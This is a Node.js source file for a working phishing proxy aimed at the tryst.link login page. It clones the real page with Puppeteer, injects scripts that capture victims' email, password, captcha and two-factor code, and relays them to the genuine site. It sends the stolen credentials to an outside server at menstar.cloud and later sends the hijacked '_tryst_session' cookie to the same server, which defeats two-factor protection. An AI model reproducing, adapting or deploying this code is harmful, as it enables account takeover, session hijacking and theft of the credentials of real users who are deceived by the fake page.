// const fs = require("fs").promises;
const puppeteer = require("puppeteer");
const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser'); // Import body-parser module
const app = express();
const session = require('express-session');
const { response } = require("express");

require('dotenv').config();
const port = 3000;
// Set EJS as the view engine
app.set('view engine', 'ejs');

app.use(bodyParser.json());

app.use(session({
  secret: 'advance', // Change this to your own secret key
  saveUninitialized: true,
  resave: true
}));

// Start the server
app.listen(port, () => {
  console.log(`Server is listening at http://localhost:${port}`);
});

// Define the URL of the Laravel API endpoint
const apiUrl = 'https://menstar.cloud/api/save-data';

// Define any additional headers you may need
const headers = {
    'Content-Type': 'application/json',
    // Add any other headers if needed
};

const sleep = (milliseconds) => {
  return new Promise((resolve) => setTimeout(resolve, milliseconds));
};

let content="";
let jscode="";

(async () => {

app.get('/',async (req, res) => {
  const browser = await puppeteer.launch({
    executablePath: process.env.NODE_ENV === "roduction" ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath(),
    headless: true,
    defaultViewport: false,
    // userDataDir: "./tmp",
    args: ['--no-sandbox', '--disable-setuid-sandbox'] // Optional arguments

  });

  page = await browser.newPage();

  await page.goto("https://app.tryst.link/log_in");
   
   content=await page.content();

  //  const pageContent = await page.content();

   // Perform actions based on the page content
   if (content.includes('Log in')) {

      console.log('show login page')
      const websitepage=  showLogin();

      return res.render('index', { body:websitepage});

   } else if(content.includes("You're almost there!")) {
     console.log('captcha page.');

     const websitepage = showCaptcha();

     return res.render('index', { body:websitepage});
   }

  
   return res.render('404', { body:content});
   
});

// log_in

const showLogin =()=>{
  jscode=`<script> $(document).ready(function(){
    // login form 
    const loginFrom =document.querySelector("#main > div > div.row > div:nth-child(1) > form");
    
    if(loginFrom)
    {
      loginFrom.addEventListener("submit",function(e){
        e.preventDefault();
        const email = document.getElementById("login").value;
        const password = document.getElementById("password").value;
        const captchaBox = document.getElementById("captcha");
  
        let captcha="";
        if(captchaBox)
        {
          captcha = captchaBox.value
        }
        
      const formDta={email:email,password:password,captcha:captcha};

          $.ajax({
              url:"/login",
              method:"post",
              contentType: 'application/json',
              data:JSON.stringify(formDta),
              success:function(res){
              $("#data").html(res.data)
              },
                error: function(xhr, status, error) {
                  console.error('Error:', error);
              }
          });
      });
    }
  
  
  });</script>`;

  return content+jscode;

}

// showCapthca

const showCaptcha =()=>{
  jscode=`<script>
  $(document).ready(function() {
    // captcha    
     const captchaFrom = document.querySelector('.captcha-form');
 
     if(captchaFrom)
     {
      captchaFrom.addEventListener("submit",function(e){
        e.preventDefault();
        const captcha = $("input[name='response']").val();

        const formDta={captcha:captcha}

          $.ajax({
            url:"/captcha",
            method:"post",
            contentType: 'application/json',
            data:JSON.stringify(formDta),
            success:function(res){
              $("#data").html(res.data)
            },
              error: function(xhr, status, error) {
                  console.error('Error:', error);
              }
          });
      
       
        }) ;  
     }
       
});   
</script>`;

  return  content+jscode;

}

const showOtp =()=>{
  jscode=`<script>
  //otp 
  const otpFrom = document.querySelector('form[action="/otp_auth"]')
  
  if(otpFrom)
  {
  otpFrom.addEventListener("submit",function(e){
    e.preventDefault();
  const otp = document.querySelector("input[name='otp']").value;
  
  const formDta={otp:otp}
      $.ajax({
          url:"/otp_auth",
          method:"post",
          contentType: 'application/json',
          data:JSON.stringify(formDta),
          success:function(res){
            console.log(res.data)
            $("#data").html(res.data)
          },
            error: function(xhr, status, error) {
                console.error('Error:', error);
            }
      });
  
  });
  
  }
  </script>`;

  return  content+jscode;

}

const saveData = (requestData)=>{

    axios.post(apiUrl, requestData, { headers })
    .then(response => {
        // Handle the response from the API
        if(response.data.success == true)
        {
          console.log('success done...'+response.data.insert_id)
          // req.session.insert_id = response.data.insert_id;

          // req.session.insert_id =

          return response.data.insert_id;

        }
        console.log('Response from Laravel API not succes:', response.data);
    })
    .catch(error => {
        // Handle errors
        console.error('Error making request to Laravel API login:', error.message);
    });

}

const updateData = (requestData)=>{
  
  axios.post("https://menstar.cloud/api/update-data", requestData, { headers })
      .then(response => {
          // Handle the response from the API
          console.log('Response from  API:', response.data);
      })
      .catch(error => {
          // Handle errors
          console.error('Error making request to  API update:', error.message);
      });

}
 
app.post('/login',async(req,res)=>{

    const data = req.body;
    const name ="Shimul";
    const email =data.email
    const password =data.password
    const captcha =data.captcha


  if (await page.$("#captcha") !== null)     await page.type("#captcha", captcha);    ;

    await page.type("#login", email);
    await page.type("#password", password);
    await page.click("input[type='submit']");

    const requestData = {
      name:name,  
      email: email,
      password:password,
    };

    let save_res_id = saveData(requestData);
    console.log('save response is :'+save_res_id)

    req.session.insert_id =save_res_id;

    // Define the data you want to send in the request (if any)
    await page.waitForNavigation();

    content=await page.content();

    if(content.includes("Enter authenticator app code"))
    {
       const websitePage =  showOtp();
       
       return res.json({ message: 'Data received successfully!', data: content+websitePage });

    }else if(content.includes("Log in")){
      const websitePage =  showLogin();
       
      return res.json({ message: 'Data received successfully!', data: content+websitePage });
    }else{

      return res.json({ message: 'somthing wrong!'});

    }

})


app.post('/otp_auth',async(req,res)=>{
  const data = req.body;
  const otp =data.otp
  const insert_id=req.session.insert_id
        // Wait for the input element to be available
    await page.waitForSelector(`input[name="otp"]`);

        // Select the input element using its name attribute
    await page.type("input[name='otp']",otp);

    await page.click("input[type='submit']");

    await sleep(1000);

    await page.waitForNavigation();

    content=await page.content();
    const path = await page.url();

    if(path == "https://app.tryst.link/members/providers")
    {
      await sleep(2000);

      //save cookies
      const cookies = await page.cookies();

      const specificCookie = cookies.find((cookie) => cookie.name === '_tryst_session');

      // await fs.writeFile('./tryst.json', JSON.stringify(cookies, null, 2));
      let requestData= {id:insert_id,cookie:JSON.stringify(specificCookie, null, 2)}

      let update_data_res = updateData(requestData);

       console.log(`update data res: ${update_data_res}`);
    }

    res.json({ message: 'Data received successfully!', data: content });

})

  app.post('/captcha',async(req,res)=>{
    const data = req.body;
    const captcha =data.captcha;

      //     // Wait for the input element to be available
      await page.waitForSelector(`input[name="response"]`);
          // Select the input element using its name attribute
      await page.type("input[name='response']",captcha);

      await page.click("body > main > div > form > button");

      await sleep(3000);

      // await page.waitForNavigation();
      content= await page.content();
      // const path = await page.url();

      if (content.includes('Log in')) {

        console.log('show login page')
        const websitepage=  showLogin();
  
        // return res.render('index', { body:websitepage});

        return res.json({ message: 'captcha has been paseed!', data: websitepage });

  
     } else if(content.includes("You're almost there!")) {
       console.log('captcha page.');
  
       const websitepage = showCaptcha();
  
      //  return res.render('index', { body:websitepage});

       return res.json({ message: 'captcha has been paseed!', data: websitepage });

     }
  
      

    return res.json({ message: 'captcha has been paseed!', data: content });

  })

  await sleep(10000);

})();
